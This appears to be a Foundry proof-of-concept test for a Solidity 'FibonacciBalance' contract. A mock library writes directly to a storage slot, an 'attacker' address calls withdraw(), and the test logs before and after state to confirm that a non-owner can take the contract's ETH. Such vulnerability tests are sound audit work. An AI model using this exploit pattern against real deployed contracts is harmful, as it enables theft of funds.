// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/FibonacciBalance.sol";

contract MockFibonacciLib {
    function setFibonacci(uint256) external {
        assembly {
            sstore(1, 1)
        }
    }
}

contract FibonacciBalanceTest is Test {
    FibonacciBalance public fib;
    MockFibonacciLib public mockLib;
    address owner = address(0x1);
    address attacker = address(0x2);

    function setUp() public {
        mockLib = new MockFibonacciLib();
        vm.deal(owner, 10 ether);
        vm.prank(owner);
        fib = new FibonacciBalance{value: 10 ether}(address(mockLib));
    }

    function testArbitraryWithdrawal() public {
        console2.log("--- BEFORE-Trigger State ---");
        // Store initial state values
        uint256 preContractBalance = address(fib).balance;
        uint256 preAttackerBalance = attacker.balance;
        uint256 preTotalWithdrawals = fib.totalWithdrawals();
        uint256 preCalculatedFib = fib.calculatedFibNumber();
        uint256 preWithdrawalCounter = fib.withdrawalCounter();
        
        // Log initial states
        console2.log("Pre-Contract ETH Balance: %s", preContractBalance);
        console2.log("Pre-Attacker ETH Balance: %s", preAttackerBalance);
        console2.log("Pre-Total Withdrawals: %s", preTotalWithdrawals);
        console2.log("Pre-Calculated Fib: %s", preCalculatedFib);
        console2.log("Pre-Withdrawal Counter: %s", preWithdrawalCounter);

        console2.log("--- Trigger Withdraw ---");
        // Attack - non-owner calls withdraw()
        vm.prank(attacker);
        fib.withdraw();

        console2.log("--- AFTER-Trigger State ---");
        // Store post-attack state values
        uint256 postContractBalance = address(fib).balance;
        uint256 postAttackerBalance = attacker.balance;
        uint256 postTotalWithdrawals = fib.totalWithdrawals();
        uint256 postCalculatedFib = fib.calculatedFibNumber();
        uint256 postWithdrawalCounter = fib.withdrawalCounter();
        
        // Log post-attack states
        console2.log("Post-Contract ETH Balance: %s", postContractBalance);
        console2.log("Post-Attacker ETH Balance: %s", postAttackerBalance);
        console2.log("Post-Total Withdrawals: %s", postTotalWithdrawals);
        console2.log("Post-Calculated Fib: %s", postCalculatedFib);
        console2.log("Post-Withdrawal Counter: %s", postWithdrawalCounter);

        // Perform differential validation
        bool balanceChanged = postAttackerBalance > preAttackerBalance && 
                              postContractBalance < preContractBalance;
        bool fibManipulated = postCalculatedFib != preCalculatedFib;
        bool withdrawalsChanged = postTotalWithdrawals > preTotalWithdrawals;
        bool counterIncremented = postWithdrawalCounter > preWithdrawalCounter;
        
        // Determine vulnerability status
        bool vulnerabilityExists = balanceChanged && fibManipulated && 
                                withdrawalsChanged && counterIncremented;

        // Final vulnerability verdict
        if (vulnerabilityExists) {
            console2.log("Vulnerability Exists: Non-owner successfully withdrew ETH by manipulating fibonacci state");
        } else {
            console2.log("Vulnerability not Exist: State changes do not match the expected exploit pattern");
        }
    }
}